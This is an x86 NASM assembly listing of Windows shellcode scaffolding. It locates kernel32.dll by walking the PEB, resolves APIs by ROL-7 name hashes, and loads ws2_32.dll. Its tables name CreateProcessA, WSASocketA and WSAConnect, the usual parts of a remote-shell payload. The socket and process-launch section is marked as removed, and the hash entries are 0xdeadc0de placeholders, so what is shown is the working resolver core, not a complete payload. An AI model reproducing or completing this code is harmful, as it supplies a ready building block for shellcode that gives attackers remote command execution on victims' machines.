[BITS 32]

mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?

mov ebp, esp
sub esp, 1000h

; Locate kernel32.dll
push edx
mov ebx, 0x4b1ffe8e
call get_module_address
pop edx

; Build kernel32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call LoadLibaryA to get ws2_32.dll into memory
push ebp
push edx
lea eax, [EDX + WS232]
push eax
call [EDX + LoadLibraryA]
pop edx
pop ebp

; Build ws2_32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + WS232HASHTABLE]
lea edi, [EDX + WS232FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call WSASocketA

; lots of user functionality removed!

; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20

end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:
cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop
ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]
; Removed the next instruction, which caused the second API function not to resolve properly
; xor ecx, ecx

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0xdeadc0de ; CreateProcessA
	dd 0xdeadc0de ; LoadLibraryA
	dd 0xFFFF

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000001
LoadLibraryA:
	dd 0x00000002

WS232HASHTABLE:
	dd 0xdeadc0de ; WSAConnect
	dd 0xdeadc0de ; WSASocketA
	dd 0xdeadc0de ; WSAStartup
	dd 0xdeadc0de ; connect
	dd 0xFFFF

WS232FUNCTIONSTABLE:
WSAConnect:
	dd 0x00000003
WSASocketA:
	dd 0x00000004
WSAStartup:
	dd 0x00000005
Connect:
	dd 0x00000006

WS232:
	db "ws2_32.dll",0x00